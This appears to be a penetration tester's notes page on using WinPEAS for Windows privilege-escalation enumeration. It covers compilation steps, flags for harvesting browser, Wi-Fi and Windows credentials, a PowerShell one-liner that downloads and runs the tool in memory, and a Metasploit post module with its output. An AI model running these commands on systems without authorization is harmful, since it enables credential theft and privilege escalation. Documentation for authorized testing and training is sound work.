# WinPEAS

## 01 - Compile

- Install a targeting pack

https://dotnet.microsoft.com/en-us/download/dotnet-framework/net481

- Compile WinPEAS

TODO: figure it out how to manually compile WinPEAS in C#

```
C:\> git clone https://github.com/carlospolop/PEASS-ng.git

C:\> cd PEASS-ng\winPEAS\winPEASexe\winPEAS

C:\PEASS-ng\winPEAS\winPEASexe\winPEAS> copy Program.cs Program.cs.bak

C:\PEASS-ng\winPEAS\winPEASexe\winPEAS> dotnet new console --force

C:\PEASS-ng\winPEAS\winPEASexe\winPEAS> dotnet add package Microsoft.VisualStudio.UnitTesting --version 11.0.50727.1

C:\PEASS-ng\winPEAS\winPEASexe\winPEAS> del Program.cs; move Program.cs.bak Program.cs
```

_**I'm still having an error**_

`C:\PEASS-ng\winPEAS\winPEASexe\winPEAS> dotnet build -c Release -p:TargetFrameworkVersion=v4.8.1`

## 02 - Manual

### 2.1 - Usage

- It will display all of the results once executed

`C:\> winPEASx64.exe`

- Runs the enumeration tool but does not display the banner

`C:\> winPEASx64.exe quiet`

- Look for sensitive files

`C:\> winPEASx64.exe fileinfo`

- Enumerate web browser databases credentials

`C:\> winPEASx64.exe browserinfo`

- Find credentials on the Windows machine and check for [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/04 - Privilege Escalation/Windows/Local Privilege Escalation/Registry/AlwaysInstallElevated/Manual|AlwaysInstallElevated]].

`C:\> winPEASx64.exe windowscreds`

- Obtaining Wi-Fi passwords, credential manager and clipboard information using the command prompt commands

`C:\> winPEASx64.exe quiet cmd`

- Display the results that is related only to the user information

`C:\> winPEASx64.exe userinfo`

- Enumerate installed programs that we might look into

`C:\> winPEASx64.exe applicationsinfo`

- Enumerate to discover any insecure services that we can hijack

`C:\> winPEASx64.exe servicesinfo`

- Provide information related to the current running processes

`C:\> winPEASx64.exe processinfo`

- Discover networking information

`C:\> winPEASx64.exe networkinfo`

- Enumerating the whole system and find kernel vulnerabilities

`C:\> winPEASx64.exe systeminfo`

- Enumerate the system quickly yet it's gonna be noisy and might be a risk to OPSEC that does absorb some resources

`C:\> winPEASx64.exe quiet searchfast`

- Search everything on the system

`C:\> winPEASx64.exe quiet searchall`

### 2.2 - Download and Execute

```powershell
$url = 'https://github.com/carlospolop/PEASS-ng/releases/download/20220821/winPEASx64.exe'

$wp = [System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```

## 03 - Metasploit

```
$ sudo cp peass.rb /usr/share/metasploit-framework/modules/post/multi/gather/

$ sudo wget -O /usr/share/metasploit-framework/modules/post/multi/gather/peass.rb https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/metasploit/peass.rb

msf > reload_all

msf > use post/multi/gather/peass

msf post(multi/gather/peass) > options

Module options (post/multi/gather/peass):

   Name        Current Setting                              Required  Description
   ----        ---------------                              --------  -----------
   PARAMETERS                                               no        Parameters to pass to the script
   PASSWORD    w2ogatdfgsh1mcathikl7j39alk715q7             no        Password to encrypt and obfuscate the script (randomly generated). The length
                                                                      must be 32B. If no password is set, only base64 will be used.
   PEASS_URL   https://github.com/carlospolop/PEASS-ng/rel  yes       Path to the PEASS script. Accepted: http(s):// URL or absolute local path. Lin
               eases/latest/download/winPEASany_ofs.exe               peas: https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
                                                                      .sh
   SESSION                                                  yes       The session to run this module on
   SRVHOST                                                  no        Set your metasploit instance IP if you want to download the PEASS script from
                                                                      here via http(s) instead of uploading it.
   SRVPORT     443                                          no        Port to download the PEASS script from using http(s) (only used if SRVHOST)
   SSL         true                                         no        Indicate if you want to communicate with https (only used if SRVHOST)
   SSLCert                                                  no        Path to a custom SSL certificate (default is randomly generated)
   TEMP_DIR                                                 no        Path to upload the obfuscated PEASS script inside the compromised machine. By
                                                                      default "C:\Windows\System32\spool\drivers\color" is used in Windows and "/tmp
                                                                      " in Unix.
   TIMEOUT     900                                          no        Timeout of the execution of the PEASS script (15min by default)
   URIPATH     /u6xm.txt                                    no        URI path to download the script from there (only used if SRVHOST)

msf post(multi/gather/peass) > advanced

Module advanced options (post/multi/gather/peass):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   ListenerBindAddress                   no        The specific IP address to bind to if different from SRVHOST
   ListenerBindPort                      no        The port to bind to if different from SRVPORT
   ListenerComm                          no        The specific communication channel to use for this service
   SSLCipher                             no        String for SSL cipher spec - "DHE-RSA-AES256-SHA" or "ADH"
   SSLCompression       false            no        Enable SSL/TLS-level compression
   SSLVersion           Auto             yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Aut
                                                   o, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)
   SendRobots           false            no        Return a robots.txt file if asked for one
   URIHOST                               no        Host to use in URI (useful for tunnels)
   URIPORT                               no        Port to use in URI (useful for tunnels)
   VERBOSE              false            no        Enable detailed status messages
   WORKSPACE                             no        Specify the workspace for this module

msf post(multi/gather/peass) > set peass_url http://<IP>:<PORT>/winPEASx64.exe

msf post(multi/gather/peass) > set session <session_id>

msf post(multi/gather/peass) > run

[+] PEASS script successfully retrieved.
[*] Encrypting PEASS and encoding it in Base64...
[*] Uploading obfuscated peass to C:\Windows\System32\spool\drivers\color\1ecke...
[+] Uploaded
[*] Running PEASS...
..[snip]..

[+] PEASS output saved to: /root/.msf4/loot/20220515165546_default_10.0.2.15_PEASS_757580.txt
[*] Post module execution completed
```

---
## References

- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

- [WinPEAS Metasploit Module](https://github.com/carlospolop/PEASS-ng/tree/master/metasploit)